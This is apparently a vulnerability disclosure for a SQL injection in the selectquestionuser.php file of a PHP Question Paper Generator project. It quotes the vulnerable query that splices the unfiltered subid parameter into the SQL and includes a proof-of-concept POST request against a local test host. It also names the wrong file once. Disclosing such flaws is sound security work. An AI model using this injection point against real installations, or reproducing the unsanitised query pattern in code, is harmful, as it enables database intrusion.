# Question Paper Generator

## supplier 
https://code-projects.org/question-paper-generator-in-php-with-source-code/
## Vulnerability file
selectquestionuser.php

## describe

**Code analysis**   

In the signupscript.php file of Question Paper Generator, the subid parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

Line 95-96 in selectquestionuser.php

```php
	$result = mysqli_query($conn, "SELECT * FROM tbq1word WHERE subid=$subid");
	$rows = mysqli_num_rows($result);
```

## POC

```
POST /exam/selectquestionuser.php HTTP/1.1
Host: 127.0.0.1:8083
Content-Length: 75
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8083
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8083/exam/addpaperuser.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=rq5tu2tv9tctf2430u6egu6tpb
Connection: close

subid=1&qtype=tbq1word&txtmarks=123&txtquestion=123&txttime=1%3A30am&edate=
```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/11775162-24fc-464b-a5e5-09ede62867e5.png)
Get payload:
![image-2025](https://github.com/asd1238525/cve/blob/main/93d28c9b-f04d-4009-8a36-5ea2038930a2.png)